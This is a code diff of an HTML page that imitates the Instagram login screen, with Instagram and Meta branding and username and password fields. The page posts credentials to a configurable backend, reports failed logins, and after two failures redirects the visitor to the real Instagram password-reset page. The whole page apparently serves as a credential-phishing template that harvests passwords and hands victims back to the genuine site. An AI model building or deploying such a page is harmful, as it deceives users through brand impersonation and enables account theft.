@@ -1,182 +1,338 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            flex-direction: column;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Log in</title>
 
-        .login-box {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px;
-            width: 350px;
-            text-align: center;
-            margin-bottom: 10px;
-        }
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
-        .instagram-logo {
-            font-family: 'Billabong', cursive, sans-serif;
-            font-size: 40px;
-            margin-bottom: 20px;
-        }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #262626;
+    }
 
-        h2 {
-            font-size: 16px;
-            font-weight: 600;
-            color: #8e8e8e;
-            margin-bottom: 20px;
-        }
+    .wrapper {
+      width: 100%;
+      max-width: 350px;
+      padding: 20px;
+      text-align: center;
+    }
 
-        form {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
+    .login-card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 35px 30px;
+      margin-bottom: 10px;
+    }
 
-        input {
-            padding: 9px 8px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            font-size: 12px;
-            background: #fafafa;
-            outline: none;
-        }
+    .brand {
+      font-size: 34px;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
 
-        input:focus {
-            border-color: #a8a8a8;
-        }
+    .title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #8e8e8e;
+      margin-bottom: 20px;
+    }
 
-        button {
-            margin-top: 8px;
-            padding: 7px 16px;
-            background-color: #0095f6;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-        }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
 
-        button:hover {
-            background-color: #1877f2;
-        }
+    input {
+      width: 100%;
+      padding: 9px 8px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      font-size: 12px;
+      outline: none;
+    }
 
-        .error-msg {
-            color: #ed4956;
-            font-size: 14px;
-            margin-top: 15px;
-            display: none; /* Hidden by default */
-        }
+    input:focus {
+      border-color: #a8a8a8;
+      background: #fff;
+    }
 
-        .links-box {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            padding: 20px;
-            width: 350px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
+    button {
+      margin-top: 8px;
+      padding: 7px 16px;
+      border: none;
+      border-radius: 8px;
+      background: #0095f6;
+      color: #fff;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+    }
 
-        .links-box a {
-            color: #00376b;
-            font-size: 12px;
-            font-weight: 600;
-            text-decoration: none;
-        }
+    button:hover {
+      background: #1877f2;
+    }
 
-        .app-download {
-            text-align: center;
-            margin-bottom: 20px;
-        }
+    .error {
+      color: #ed4956;
+      font-size: 14px;
+      margin-top: 15px;
+      min-height: 20px;
+    }
 
-        .app-download p {
-            font-size: 14px;
-            margin: 5px 0;
-        }
+    .error:empty {
+      display: none;
+    }
 
-        .footer {
-            text-align: center;
-            font-size: 12px;
-            color: #8e8e8e;
-        }
-        
-        .footer span {
-            margin: 0 10px;
-        }
-    </style>
+    .note {
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-top: 10px;
+    }
+
+    .secondary-card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 18px;
+      margin-bottom: 20px;
+    }
+
+    .secondary-card a {
+      color: #00376b;
+      font-size: 12px;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #8e8e8e;
+    }
+
+    .footer a {
+      color: #8e8e8e;
+      text-decoration: none;
+      margin-right: 8px;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="login-box">
-        <div class="instagram-logo">Instagram</div>
-        <h2>Log into Instagram</h2>
-        
-        <form id="loginForm">
-            <input type="text" placeholder="Phone number, username, or email" required>
-            <input type="password" placeholder="Password" required>
-            <button type="submit">Log in</button>
-        </form>
-        
-        <!-- Error message area matching your text -->
-        <p class="error-msg" id="errorMsg">{{ error }} Please enter your password. Not able to do forget password.</p>
+  <div class="wrapper">
+    <div class="login-card">
+      <div class="brand">Instagram</div>
+      <div class="title">Log into Instagram</div>
+
+      <!--
+        If you are posting to a real backend, change action="/login"
+        or whatever your login endpoint is.
+      -->
+      <form id="loginForm" method="post" action="">
+        <input
+          type="text"
+          id="username"
+          name="username"
+          placeholder="Phone number, username, or email"
+          autocomplete="username"
+          required
+        />
+
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Password"
+          autocomplete="current-password"
+          required
+        />
+
+        <button type="submit" id="loginButton">Log in</button>
+      </form>
+
+      <!-- Server error placeholder -->
+      <div class="error" id="loginError">{{ error }}</div>
+
+      <div class="note">
+        Please enter your password. Not able to do forget password.
+      </div>
     </div>
 
-    <div class="links-box">
-        <a href="https://www.instagram.com/accounts/password/reset/?hl=en" id="forgotPassLink">Forgot password?</a>
-    </div>
-
-    <div class="app-download">
-        <p>Create new account</p>
+    <div class="secondary-card">
+      <a
+        id="forgotPasswordLink"
+        href="https://www.instagram.com/accounts/password/reset/?hl=en"
+      >
+        Forgot password?
+      </a>
     </div>
 
     <div class="footer">
-        <span>Meta</span>
+      <a href="#">Create new account</a>
+      <span>Meta</span>
     </div>
+  </div>
 
-    <script>
-        let failedAttempts = 0;
-        const maxAttempts = 2;
-        const resetUrl = "https://www.instagram.com/accounts/password/reset/?hl=en";
+  <script>
+    (function () {
+      /*
+        CONFIG
+      */
+      const MAX_ATTEMPTS = 2;
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            // Prevent default form submission for this demo
-            e.preventDefault(); 
-            
-            // Simulate a failed login (Replace this with your actual backend check)
-            const isLoginSuccessful = false; 
+      const FORGOT_PASSWORD_URL =
+        document.getElementById("forgotPasswordLink")?.href ||
+        "https://www.instagram.com/accounts/password/reset/?hl=en";
 
-            if (!isLoginSuccessful) {
-                failedAttempts++;
-                
-                if (failedAttempts >= maxAttempts) {
-                    // Redirect to forgot password after 2 attempts
-                    alert("2 failed attempts detected. Redirecting to Forgot Password...");
-                    window.location.href = resetUrl; 
-                } else {
-                    // Show error message
-                    const errorMsg = document.getElementById('errorMsg');
-                    errorMsg.style.display = 'block';
-                    errorMsg.innerText = `{{ error }} Please enter your password. Not able to do forget password. (${maxAttempts - failedAttempts} attempt left)`;
-                }
+      const ATTEMPTS_KEY = "failedLoginAttempts";
+      const PENDING_KEY = "pendingLoginAttempt";
+      const SUCCESS_KEY = "loginSuccess";
+
+      /*
+        Set this to false when your form is connected to a real backend
+        that validates username/password and reloads the page with {{ error }}.
+
+        Keep it true if you just want to test the UI/redirect locally.
+      */
+      const SIMULATE_FAILED_LOGIN = true;
+
+      const form = document.getElementById("loginForm");
+      const errorBox = document.getElementById("loginError");
+      const usernameInput = document.getElementById("username");
+      const passwordInput = document.getElementById("password");
+
+      function getAttempts() {
+        return parseInt(sessionStorage.getItem(ATTEMPTS_KEY) || "0", 10);
+      }
+
+      function setAttempts(value) {
+        sessionStorage.setItem(ATTEMPTS_KEY, String(value));
+      }
+
+      function clearAttempts() {
+        sessionStorage.removeItem(ATTEMPTS_KEY);
+        sessionStorage.removeItem(PENDING_KEY);
+      }
+
+      function showError(message) {
+        if (errorBox) {
+          errorBox.textContent = message;
+        }
+      }
+
+      function redirectToForgotPassword() {
+        clearAttempts();
+        window.location.replace(FORGOT_PASSWORD_URL);
+      }
+
+      function registerFailedAttempt(message) {
+        const currentAttempts = getAttempts();
+        const newAttempts = currentAttempts + 1;
+
+        setAttempts(newAttempts);
+
+        if (newAttempts >= MAX_ATTEMPTS) {
+          redirectToForgotPassword();
+          return true;
+        }
+
+        const remaining = MAX_ATTEMPTS - newAttempts;
+
+        showError(
+          (message || "Login failed.") +
+          " (" +
+          remaining +
+          " attempt left before redirect)"
+        );
+
+        return false;
+      }
+
+      /*
+        If your backend redirects to something like:
+        /login?login=success
+        this will clear the failed attempt counter.
+      */
+      const urlParams = new URLSearchParams(window.location.search);
+
+      if (
+        urlParams.get("login") === "success" ||
+        sessionStorage.getItem(SUCCESS_KEY) === "1"
+      ) {
+        clearAttempts();
+        sessionStorage.removeItem(SUCCESS_KEY);
+      }
+
+      /*
+        Real backend mode:
+        If the server rendered an actual error inside #loginError,
+        count it as one failed attempt, but only if the user actually submitted
+        the form. This avoids counting normal page refreshes repeatedly.
+      */
+      const serverHasRealError =
+        errorBox &&
+        errorBox.textContent.trim().length > 0 &&
+        !errorBox.textContent.includes("{{");
+
+      if (
+        !SIMULATE_FAILED_LOGIN &&
+        serverHasRealError &&
+        sessionStorage.getItem(PENDING_KEY) === "1"
+      ) {
+        sessionStorage.removeItem(PENDING_KEY);
+        registerFailedAttempt(errorBox.textContent.trim());
+      }
+
+      /*
+        Form submit handler.
+      */
+      if (form) {
+        form.addEventListener("submit", function (event) {
+          if (SIMULATE_FAILED_LOGIN) {
+            /*
+              Demo/local testing mode:
+              Treat every submit as a failed login so you can see the redirect.
+            */
+            event.preventDefault();
+
+            let message = "";
+
+            if (!usernameInput.value.trim() || !passwordInput.value) {
+              message = "Please enter your password.";
             } else {
-                // Handle successful login
-                window.location.href = "/"; 
+              message =
+                errorBox &&
+                errorBox.textContent.trim() &&
+                !errorBox.textContent.includes("{{")
+                  ? errorBox.textContent.trim()
+                  : "Incorrect password.";
             }
+
+            registerFailedAttempt(message);
+          } else {
+            /*
+              Real backend mode:
+              Mark that a login attempt was submitted.
+              After the server reloads the page with an error,
+              the script above will count it.
+            */
+            sessionStorage.setItem(PENDING_KEY, "1");
+          }
         });
-    </script>
+      }
+    })();
+  </script>
 
 </body>
 </html>
